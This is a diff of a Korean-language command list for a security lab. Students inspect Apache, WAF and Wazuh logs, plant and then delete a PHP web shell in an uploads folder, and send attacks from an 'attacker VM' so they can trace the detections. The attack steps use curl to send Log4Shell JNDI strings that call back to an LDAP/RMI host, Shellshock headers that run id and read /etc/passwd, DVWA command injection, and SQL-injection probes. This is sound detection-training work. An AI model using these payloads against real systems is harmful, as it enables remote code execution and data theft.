@@ -2,129 +2,241 @@
   {
     "type": "command",
     "id": "C07-01",
+    "where": "kt66 VM · 호스트 터미널",
     "text": "docker exec -it kt66-web /bin/bash",
-    "why": "docker exec는 실행 중인 컨테이너에서 프로그램을 시작한다. -i는 입력 유지, -t는 터미널 할당, /bin/bash는 대화형 셸이다.",
-    "result": "이후 파일 명령은 kt66-web 안에서 실행한다.",
-    "where": "kt66 VM · 호스트 터미널"
+    "why": "docker exec는 실행 중인 컨테이너에서 프로그램을 시작한다. -i는 입력을 유지하고 -t는 터미널을 할당한다. /bin/bash는 대화형 셸이다.",
+    "result": "kt66-web 안의 셸이 열린다. Docker 권한 오류가 나면 1장의 그룹·로그인 상태를 확인한다."
   },
   {
     "type": "command",
     "id": "C07-02",
-    "text": "ls -ld /var/www/html/uploads",
-    "why": "ls는 파일 정보를 표시한다. -l은 상세 정보, -d는 디렉터리 자체의 정보를 표시한다.",
-    "result": "폴더가 있는지 확인한다. 없을 때만 다음 명령으로 만든다.",
-    "where": "kt66-web 컨테이너 안"
+    "where": "kt66-web · 컨테이너 셸",
+    "text": "tail -n 20 /var/log/apache2/dvwa_access.log",
+    "why": "tail은 파일 끝부분을 읽는다. -n 20은 마지막 20줄을 출력한다. Juice 요청은 파일명을 juice_access.log로 바꿔 읽는다.",
+    "result": "요청 시각·URL·응답을 확인한다. 다른 요청이 많으면 20을 늘리거나 7.8의 검색을 사용한다."
   },
   {
     "type": "command",
     "id": "C07-03",
-    "text": "mkdir -p /var/www/html/uploads",
-    "why": "mkdir는 디렉터리를 만든다. -p는 필요한 상위 경로도 만들고 기존 폴더는 유지한다.",
-    "result": "ls -ld /var/www/html/uploads로 생성 결과를 확인한다.",
-    "where": "kt66-web 컨테이너 안"
+    "where": "kt66-web · 컨테이너 셸",
+    "text": "exit",
+    "why": "exit는 현재 셸을 종료한다.",
+    "result": "kt66 VM의 호스트 터미널로 돌아간다."
   },
   {
     "type": "command",
     "id": "C07-04",
-    "text": "ls -l /var/www/html/uploads/book07-shell.php",
-    "why": "쓸 파일의 존재 여부를 먼저 확인한다. book07-shell.php는 이 실습의 새 파일명이다.",
-    "result": "No such file or directory일 때 진행한다. 이미 있으면 내용을 확인하고 다른 실습 파일명을 정한다.",
-    "where": "kt66-web 컨테이너 안"
+    "where": "kt66 VM · 호스트 터미널",
+    "text": "docker exec -it kt66-web /bin/bash",
+    "why": "kt66 호스트에서 web 컨테이너의 대화형 셸을 연다.",
+    "result": "다음 명령은 kt66-web 안에서 실행한다."
   },
   {
     "type": "command",
     "id": "C07-05",
-    "text": "vim /var/www/html/uploads/book07-shell.php",
-    "why": "Vim은 kt66-web에 설치된 텍스트 편집기이다. i를 눌러 입력 모드로 바꾸고 다음 코드를 입력한다. Esc → :wq → Enter로 저장하고 닫는다.",
-    "result": "PHP 코드를 파일로 저장한다. :wq에서 w는 저장, q는 종료이다. 저장하지 않고 취소하려면 Esc → :q! → Enter를 누른다.",
-    "where": "kt66-web 컨테이너 안"
+    "where": "kt66-web · 컨테이너 셸",
+    "text": "grep -n -F '/var/www' /var/ossec/etc/ossec.conf",
+    "why": "grep은 파일에서 조건에 맞는 줄을 찾는다. -n은 줄 번호, -F는 정규표현식 대신 문자 그대로 검색한다. 작은따옴표는 검색 문자열을 한 인자로 묶는다.",
+    "result": "/var/www를 포함한 directories 항목과 realtime=\"yes\"를 확인한다. 없으면 파일 생성 전에 수집 준비를 점검한다."
   },
   {
     "type": "command",
     "id": "C07-06",
-    "text": "cat /var/www/html/uploads/book07-shell.php",
-    "why": "cat은 파일 내용을 출력한다. 저장한 내용과 위 코드를 대조한다.",
-    "result": "PHP 구문이 그대로 저장돼 있어야 한다. 달러 기호($)나 따옴표가 빠지지 않았는지 확인한다.",
-    "where": "kt66-web 컨테이너 안"
+    "where": "kt66-web · 컨테이너 셸",
+    "text": "ls -ld /var/www/html/uploads",
+    "why": "ls는 파일·폴더 정보를 표시한다. -l은 상세 정보, -d는 폴더 내용 대신 폴더 자체를 표시한다.",
+    "result": "폴더 존재 여부를 적는다. 없을 때만 mkdir -p /var/www/html/uploads로 만들고 같은 ls로 다시 확인한다."
   },
   {
     "type": "command",
     "id": "C07-07",
-    "text": "exit",
-    "why": "현재 컨테이너 셸을 닫는다.",
-    "result": "kt66 호스트 터미널로 돌아간다.",
-    "where": "kt66-web 컨테이너 안"
+    "where": "kt66-web · 컨테이너 셸",
+    "text": "ls -l /var/www/html/uploads/book07-shell.php",
+    "why": "이번 실습 파일이 이미 있는지 확인한다.",
+    "result": "No such file or directory일 때 새 파일을 만든다. 이미 있으면 덮어쓰지 말고 다른 파일명을 정해 이후 입력에도 동일하게 쓴다."
   },
   {
     "type": "command",
     "id": "C07-08",
-    "text": "docker exec -it kt66-web /bin/bash",
-    "why": "-it로 대화형 셸에 접속한다.",
-    "result": "이후 삭제·확인은 kt66-web 안에서 한다.",
-    "where": "kt66 VM · 호스트 터미널"
+    "where": "kt66-web · 컨테이너 셸",
+    "text": "vim /var/www/html/uploads/book07-shell.php",
+    "why": "Vim은 텍스트 편집기이다. kt66-web에 준비된 편집기로 PHP 코드를 저장한다. i를 누르고 아래 내용을 입력한 뒤 Esc, :wq, Enter 순서로 저장한다.",
+    "result": "w는 저장, q는 종료이다. 취소할 때는 Esc, :q!, Enter를 사용한다."
   },
   {
     "type": "command",
     "id": "C07-09",
+    "where": "kt66-web · 컨테이너 셸",
     "text": "cat /var/www/html/uploads/book07-shell.php",
-    "why": "삭제할 파일의 내용을 먼저 읽는다.",
-    "result": "이번에 작성한 PHP 코드인지 확인한다.",
-    "where": "kt66-web 컨테이너 안"
+    "why": "cat은 파일 내용을 출력한다. 저장한 코드와 앞의 예제를 대조한다.",
+    "result": "$_GET과 따옴표가 그대로 있어야 한다. 셸의 변수 치환으로 내용이 달라지지 않았는지 확인한다."
   },
   {
     "type": "command",
     "id": "C07-10",
-    "text": "rm -i /var/www/html/uploads/book07-shell.php",
-    "why": "rm은 파일을 삭제하고 -i는 삭제 전에 확인을 묻는다.",
-    "result": "표시된 경로가 맞으면 y를 입력한다.",
-    "where": "kt66-web 컨테이너 안"
+    "where": "kt66-web · 컨테이너 셸",
+    "text": "exit",
+    "why": "컨테이너 셸을 종료한다.",
+    "result": "kt66 호스트로 돌아간다."
   },
   {
     "type": "command",
     "id": "C07-11",
-    "text": "ls -l /var/www/html/uploads/book07-shell.php",
-    "why": "삭제 후 같은 파일을 조회한다.",
-    "result": "No such file or directory이면 제거됐다.",
-    "where": "kt66-web 컨테이너 안"
+    "where": "kt66 VM · 호스트 터미널",
+    "text": "docker exec -it kt66-web /bin/bash",
+    "why": "실습 파일을 정리할 컨테이너로 들어간다.",
+    "result": "이후 파일 확인·삭제는 kt66-web에서 한다."
   },
   {
     "type": "command",
     "id": "C07-12",
-    "text": "exit",
-    "why": "컨테이너 셸을 닫는다.",
-    "result": "호스트로 돌아간다.",
-    "where": "kt66-web 컨테이너 안"
+    "where": "kt66-web · 컨테이너 셸",
+    "text": "cat /var/www/html/uploads/book07-shell.php",
+    "why": "삭제 전에 이번에 작성한 내용인지 읽는다.",
+    "result": "다른 파일이면 중단하고 생성 때 사용한 경로를 확인한다."
   },
   {
     "type": "command",
     "id": "C07-13",
-    "text": "curl --version",
-    "why": "--version은 버전과 지원 기능을 표시한다. 기본 구문은 curl 옵션 URL이다.",
-    "result": "버전이 나오면 다음 요청을 수행할 수 있다. 없으면 1.12의 도구 설치를 먼저 마친다.",
-    "where": "공격자 VM · 터미널"
+    "where": "kt66-web · 컨테이너 셸",
+    "text": "rm -i /var/www/html/uploads/book07-shell.php",
+    "why": "rm은 파일을 삭제하며 -i는 삭제 전에 확인한다.",
+    "result": "확인창의 경로가 맞으면 y를 입력한다. 이어 ls -l /var/www/html/uploads/book07-shell.php에서 파일이 없음을 확인한다."
   },
   {
     "type": "command",
     "id": "C07-14",
-    "text": "curl -i --max-time 15 \\\n  -A '${jndi:ldap://192.168.0.202:1389/a}' \\\n  'http://dvwa.kt66.lab/?book07=lookup'",
-    "why": "User-Agent에 JNDI 조회 형태의 문자열을 넣는다. q 대신 book07 표식을 URL에 붙여 요청을 구분한다. IP는 자신의 공격자 VM 주소를 쓴다.",
-    "result": "상태·본문을 읽고 Q07-02에서 같은 요청을 찾는다. full_log에서 실제 헤더 값을 확인한다.",
-    "where": "공격자 VM · 터미널"
+    "where": "kt66 VM · 호스트 터미널",
+    "text": "docker exec -it kt66-web /bin/bash",
+    "why": "접속 로그와 WAF 설정을 읽을 web 컨테이너로 들어간다.",
+    "result": "다음 조회는 kt66-web 안에서 수행한다."
   },
   {
     "type": "command",
     "id": "C07-15",
-    "text": "curl -i --max-time 15 \\\n  -A '() { :; }; /bin/bash -c \"id\"' \\\n  http://juice.kt66.lab/cgi-bin/test.cgi",
-    "why": "-A로 User-Agent 값을 지정한다. 큰따옴표는 바깥 작은따옴표 안에 있으므로 헤더에 포함된 문자로 전달된다.",
-    "result": "HTTP 상태와 Q07-03의 경보를 대조한다. 명령 실행은 응답 본문·서버 기록으로 별도 확인한다.",
-    "where": "공격자 VM · 터미널"
+    "where": "kt66-web · 컨테이너 셸",
+    "text": "grep -n -F 'book07-shell.php' \\\n  /var/log/apache2/landing_access.log",
+    "why": "파일명 그대로 검색한다. -n은 줄 번호, -F는 문자 검색이다. 줄 끝의 역슬래시(\\)는 다음 줄을 한 명령으로 연결하며 그 뒤에 공백을 넣지 않는다.",
+    "result": "시각·출발지·요청 줄·상태를 읽는다. 새 파일명을 정했다면 검색값도 바꾼다."
   },
   {
     "type": "command",
     "id": "C07-16",
-    "text": "curl -i --max-time 15 \\\n  -H 'Referer: () { :; }; id' \\\n  http://dvwa.kt66.lab/cgi-bin/status",
-    "why": "-H는 Referer 헤더를 추가한다. 콜론 뒤는 헤더 값이다. 이번에는 함수 구문 뒤에 id를 붙인다.",
-    "result": "User-Agent 대신 Referer에 남은 구문과 응답을 원문에서 확인한다.",
-    "where": "공격자 VM · 터미널"
+    "where": "kt66-web · 컨테이너 셸",
+    "text": "grep -n -E 'ServerName|DocumentRoot|ProxyPass|SecRuleEngine' \\\n  /etc/apache2/sites-enabled/*.conf",
+    "why": " -E는 확장 정규표현식을 사용한다. 작은따옴표 안의 파이프(|)는 네 이름 중 하나를 고르는 OR이다. 셸에서 명령 사이의 |로 출력을 전달하는 용법과 다르다. *.conf는 셸이 해당 이름의 파일 목록으로 펼친다.",
+    "result": "사이트 이름·문서 루트·프록시 대상·WAF 모드를 연결한다. 이 긴 식은 예제 파일에서 복사할 수 있다."
+  },
+  {
+    "type": "command",
+    "id": "C07-17",
+    "where": "kt66-web · 컨테이너 셸",
+    "text": "tail -n 5 /var/log/apache2/modsec_audit.log",
+    "why": "WAF 감사 로그 끝의 다섯 줄을 읽는다. JSON 한 줄이 길 수 있으므로 터미널에서 줄 전체를 확인한다.",
+    "result": "요청·응답·탐지 메시지를 같은 트랜잭션 안에서 대조한다. 최근 요청이 아니면 Discover의 시간 조건으로 찾는다."
+  },
+  {
+    "type": "command",
+    "id": "C07-18",
+    "where": "kt66-web · 컨테이너 셸",
+    "text": "exit",
+    "why": "web 컨테이너 셸을 닫는다.",
+    "result": "kt66 호스트로 돌아간다."
+  },
+  {
+    "type": "command",
+    "id": "C07-19",
+    "where": "kt66 VM · 호스트 터미널",
+    "text": "docker exec -it kt66-dvwa /bin/bash",
+    "why": "DVWA 처리 코드를 읽을 컨테이너로 들어간다.",
+    "result": "웹 프록시가 아닌 DVWA 안의 셸인지 확인한다."
+  },
+  {
+    "type": "command",
+    "id": "C07-20",
+    "where": "kt66-dvwa · 컨테이너 셸",
+    "text": "cat /var/www/html/vulnerabilities/exec/source/low.php",
+    "why": "PHP 처리 코드를 출력한다.",
+    "result": "POST의 Submit 조건, ip 입력, shell_exec와 ping 조합을 확인한다. 앞서 전송한 GET·POST와 비교한다."
+  },
+  {
+    "type": "command",
+    "id": "C07-21",
+    "where": "kt66-dvwa · 컨테이너 셸",
+    "text": "exit",
+    "why": "DVWA 컨테이너 셸을 닫는다.",
+    "result": "kt66 호스트로 돌아간다."
+  },
+  {
+    "type": "command",
+    "id": "C07-22",
+    "where": "kt66 VM · 호스트 터미널",
+    "text": "docker exec -it kt66-siem /bin/bash",
+    "why": "Wazuh Manager가 있는 컨테이너로 들어간다.",
+    "result": "웹 로그 파일과 탐지 규칙 파일의 위치를 구분한다."
+  },
+  {
+    "type": "command",
+    "id": "C07-23",
+    "where": "kt66-siem · 컨테이너 셸",
+    "text": "grep -n -A 16 -F 'id=\"31106\"' \\\n  /var/ossec/ruleset/rules/0245-web_rules.xml",
+    "why": "grep의 -A 16은 일치한 줄과 그 뒤 16줄을 출력한다. -n은 줄 번호, -F는 문자 그대로 검색한다. 작은따옴표는 큰따옴표를 포함한 검색값을 그대로 전달한다.",
+    "result": "<rule>부터 </rule>까지 읽어 if_sid와 id 조건을 확인한다. 검색값의 31106을 31108·31120·31122·31162·31166·31168로 하나씩 바꾸어 같은 명령을 실행한다."
+  },
+  {
+    "type": "command",
+    "id": "C07-24",
+    "where": "공격자 VM · 터미널",
+    "text": "curl --version",
+    "why": "--version은 설치 버전과 지원 기능을 표시한다. 기본 구문은 curl 옵션 URL이다.",
+    "result": "설치돼 있으면 버전이 출력된다. 없으면 1.12의 공격자 도구 준비를 먼저 마친다."
+  },
+  {
+    "type": "command",
+    "id": "C07-25",
+    "where": "공격자 VM · 터미널",
+    "text": "curl -i --max-time 15 --get \\\n  -A '${jndi:ldap://192.168.0.108:1389/a}' \\\n  --data-urlencode \\\n  'q=${jndi:ldap://192.168.0.108:1389/a}' \\\n  http://dvwa.ccc.com/",
+    "why": "작은따옴표는 ${…}를 공격자 셸이 먼저 치환하는 것을 막는다. 인코딩된 q는 URL에, -A의 값은 User-Agent에 실린다.",
+    "result": "상태·본문과 JNDI 검색 결과를 연결한다. 조회 서버의 실제 동작은 별도의 통신·실행 기록이 필요하다."
+  },
+  {
+    "type": "command",
+    "id": "C07-26",
+    "where": "공격자 VM · 터미널",
+    "text": "curl -i --max-time 15 \\\n  -H 'X-Api-Version: ${${lower:j}ndi:ldap://192.168.0.108:1389/b}' \\\n  -A '${jndi:rmi://192.168.0.108:1099/c}' \\\n  http://dvwa.ccc.com/",
+    "why": "X-Api-Version에는 LDAP 변형, User-Agent에는 RMI 조회 형태를 넣는다. 바깥 작은따옴표는 두 표현식을 셸에서 실행하지 않고 헤더 문자로 전달한다.",
+    "result": "슬라이드 변형의 응답은 302였다. 이 명령의 상태·Location·본문을 읽고 수집된 헤더를 각각 확인한다."
+  },
+  {
+    "type": "command",
+    "id": "C07-27",
+    "where": "공격자 VM · 터미널",
+    "text": "curl -i --max-time 15 \\\n  -A '() { :; }; /bin/bash -c \"id\"' \\\n  http://juice.ccc.com/cgi-bin/test.cgi",
+    "why": "User-Agent에 함수 형태와 id 실행 시도를 넣는다. 큰따옴표는 바깥 작은따옴표 안에 있으므로 헤더에 그대로 전달된다.",
+    "result": "슬라이드의 200과 응답 본문을 구분해 읽는다. Shellshock 규칙과 같은 요청의 원문을 대조한다."
+  },
+  {
+    "type": "command",
+    "id": "C07-28",
+    "where": "공격자 VM · 터미널",
+    "text": "curl -i --max-time 15 \\\n  -H 'Referer: () { :; }; /bin/bash -c \"cat /etc/passwd\"' \\\n  http://dvwa.ccc.com/cgi-bin/status",
+    "why": "Referer는 요청이 시작된 페이지를 알리는 헤더이다. -H로 그 값에 함수 형태와 파일 읽기 시도를 넣는다. 콜론은 헤더 이름과 값을 나눈다.",
+    "result": "슬라이드의 이 요청은 403이었다. 원문의 Referer 위치와 상태를 함께 확인한다."
+  },
+  {
+    "type": "command",
+    "id": "C07-29",
+    "where": "공격자 VM · 터미널",
+    "text": "curl -i --max-time 15 \\\n  --data 'ip=127.0.0.1;id&Submit=Submit' \\\n  http://dvwa.ccc.com/vulnerabilities/exec/",
+    "why": "ip는 공격 입력, Submit은 DVWA 처리 시작 조건에 필요한 폼 필드이다. -X POST를 추가하지 않아도 --data가 POST를 선택한다.",
+    "result": "인증 쿠키를 지정하지 않은 이 요청과 로그인한 브라우저 POST는 구분한다. 302이면 Location을 확인한다."
+  },
+  {
+    "type": "command",
+    "id": "C07-30",
+    "where": "공격자 VM · 터미널",
+    "text": "for i in $(seq 1 20); do\n  curl -sS --max-time 15 -o /dev/null \\\n    -w \"%{http_code} \" \\\n    \"http://juice.ccc.com/rest/products/search?q=%27$i\"\ndone\nprintf \"\\n\"",
+    "why": "seq는 1~20을 출력하고 $(…)는 그 출력을 반복 목록으로 쓴다. for는 각 숫자를 i에 넣어 do~done을 반복한다.",
+    "result": "응답 수와 요청 수를 적는다. 000이면 HTTP 응답을 얻지 못한 원인을 오류 메시지에서 확인한다."
   }
 ]
